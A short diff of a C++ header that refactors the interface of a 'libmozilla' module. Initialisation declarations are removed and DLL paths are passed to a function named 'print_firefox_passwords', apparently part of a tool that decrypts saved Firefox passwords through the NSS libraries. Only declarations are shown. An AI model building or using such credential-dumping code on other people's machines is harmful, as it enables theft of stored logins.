@@ -28,10 +28,5 @@
 #include <string>
 
 namespace libmozilla {
-	extern bool initialized;
-	extern HMODULE hnss3Lib;
-	extern HMODULE hmozglueLib;
-	void init(std::wstring nss3Dll, std::wstring mozglueDll);
-	void finalize(void);
-	void print_firefox_passwords(std::wstring path, std::wstring signons);
+	void print_firefox_passwords(std::wstring path, std::wstring signons, std::wstring nss3Dll, std::wstring mozglueDll);
 }
